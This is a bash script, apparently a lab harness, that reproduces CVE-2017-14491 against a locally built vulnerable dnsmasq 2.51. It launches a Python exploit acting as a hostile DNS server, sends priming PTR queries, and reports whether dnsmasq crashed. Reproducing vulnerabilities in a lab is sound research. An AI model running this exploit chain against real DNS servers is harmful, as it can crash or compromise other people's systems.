#!/usr/bin/env bash
# Lab harness v4 — PID-tracked, no pkill -f (never kills the calling shell).
# Proves CVE-2017-14491 against a locally built, genuinely vulnerable dnsmasq 2.51.
set -u
LAB="$(cd "$(dirname "$0")" && pwd)"
DM="$LAB/dnsmasq-git/src/dnsmasq"
CONF="$LAB/etc/dnsmasq.conf"
LOG="$LAB/dnsmasq.log"
ATTACK_LOG="$LAB/attacker.log"
ATT_PID=""; DM_PID=""

stop() { [ -n "$DM_PID" ] && kill "$DM_PID" 2>/dev/null; [ -n "$ATT_PID" ] && kill "$ATT_PID" 2>/dev/null; sleep 0.4; }
trap stop EXIT

echo "### [1] attacker-controlled DNS server on 127.0.0.2:5300"
( cd "$LAB" && exec python2 google_cve_2017_14491.py 127.0.0.2 5300 >"$ATTACK_LOG" 2>&1 ) &
ATT_PID=$!
sleep 1.2
if ! kill -0 "$ATT_PID" 2>/dev/null; then echo "  FAIL: attacker down:"; cat "$ATTACK_LOG"; exit 1; fi
echo "  attacker up pid=$ATT_PID | $(head -1 "$ATTACK_LOG")"

echo "### [2] dnsmasq 2.51 forwarding to attacker"
"$DM" -C "$CONF" --no-daemon >"$LOG" 2>&1 &
DM_PID=$!
sleep 1.5
if ! kill -0 "$DM_PID" 2>/dev/null; then echo "  FAIL: dnsmasq down:"; cat "$LOG"; exit 1; fi
echo "  dnsmasq up pid=$DM_PID | $(head -1 "$LOG")"

echo "### [3] priming: PTR 8.8.8.125 x3 (Google instruction)"
for i in 1 2 3; do
  dig @127.0.0.1 -p 53535 -x 8.8.8.125 +time=3 +tries=1 >/dev/null 2>&1
  sleep 0.6
  if ! kill -0 "$DM_PID" 2>/dev/null; then echo "  dnsmasq died after query $i"; break; fi
done
sleep 1

echo "### [4] VERDICT"
if kill -0 "$DM_PID" 2>/dev/null; then
  echo "  ALIVE pid=$DM_PID -> NO CRASH"
else
  echo "  DEAD -> CRASHED (CVE-2017-14491 reproduced)"
fi
echo "### attacker handled: $(grep -c UDP "$ATTACK_LOG") UDP request(s)"
echo "### dnsmasq log:"; grep -vE '^dnsmasq: reply' "$LOG" | tail -8
